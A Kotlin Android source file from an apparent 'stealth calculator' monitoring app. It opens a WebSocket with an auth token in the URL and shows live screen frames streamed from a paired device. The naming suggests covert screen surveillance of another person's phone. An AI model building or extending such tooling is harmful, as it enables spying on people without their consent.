package com.stealthcalc.monitoring.ui

import android.graphics.BitmapFactory
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.getValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import dagger.hilt.android.lifecycle.HiltViewModel
import io.ktor.client.HttpClient
import io.ktor.client.engine.okhttp.OkHttp
import io.ktor.client.plugins.websocket.WebSockets
import io.ktor.client.plugins.websocket.webSocket
import io.ktor.websocket.Frame
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

data class LiveScreenState(
    val isConnected: Boolean = false,
    val currentFrame: ImageBitmap? = null,
    val error: String? = null,
)

@HiltViewModel
class LiveScreenViewModel @Inject constructor(
    private val repository: MonitoringRepository,
) : ViewModel() {

    private val _state = MutableStateFlow(LiveScreenState())
    val state: StateFlow<LiveScreenState> = _state.asStateFlow()

    fun startWatching() {
        val baseUrl = repository.serverUrl.trimEnd('/')
        if (baseUrl.isBlank() || !repository.isPaired) {
            _state.value = LiveScreenState(error = "Not paired")
            return
        }
        val wsUrl = baseUrl.replace("http://", "ws://").replace("https://", "wss://")
        val client = HttpClient(OkHttp) { install(WebSockets) }

        viewModelScope.launch {
            runCatching {
                client.webSocket("$wsUrl/stream/watch/${repository.deviceId}?token=${repository.authToken}") {
                    _state.value = LiveScreenState(isConnected = true)
                    for (frame in incoming) {
                        if (!isActive) break
                        if (frame is Frame.Binary) {
                            val bitmap = BitmapFactory.decodeByteArray(frame.data, 0, frame.data.size)
                            if (bitmap != null) {
                                _state.value = LiveScreenState(
                                    isConnected = true,
                                    currentFrame = bitmap.asImageBitmap(),
                                )
                            }
                        }
                    }
                }
            }.onFailure { e ->
                _state.value = LiveScreenState(error = "Stream error: ${e.message}")
            }
            _state.value = _state.value.copy(isConnected = false)
            client.close()
        }
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun LiveScreenScreen(
    onBack: () -> Unit,
    viewModel: LiveScreenViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()

    DisposableEffect(Unit) {
        viewModel.startWatching()
        onDispose { }
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Text(if (state.isConnected) "Live Screen" else "Connecting...")
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(padding)
                .background(MaterialTheme.colorScheme.background),
            contentAlignment = Alignment.Center,
        ) {
            state.currentFrame?.let { frame ->
                Image(
                    bitmap = frame,
                    contentDescription = "Live screen",
                    modifier = Modifier.fillMaxSize(),
                    contentScale = ContentScale.Fit,
                )
            } ?: run {
                if (state.error != null) {
                    Text(state.error!!, color = MaterialTheme.colorScheme.error)
                } else {
                    CircularProgressIndicator()
                }
            }
        }
    }
}
